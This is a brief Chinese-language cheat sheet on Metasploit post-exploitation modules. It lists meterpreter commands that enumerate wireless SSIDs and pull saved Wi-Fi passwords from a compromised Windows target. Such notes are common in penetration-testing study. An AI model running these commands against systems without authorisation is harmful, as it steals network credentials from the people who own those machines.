# Metasploit其他后渗透模块

### 收集无线SSID信息 

```
run post/windows/wlan/wlan_bss_list
meterpreter > run post/windows/wlan/wlan_bss_list
```

### 收集无线Wifi密码

```
run post/windows/wlan/wlan_profile
```

可以收集目标系统上保存的Wifi登录凭证。

```
meterpreter > run post/windows/wlan/wlan_profile
```
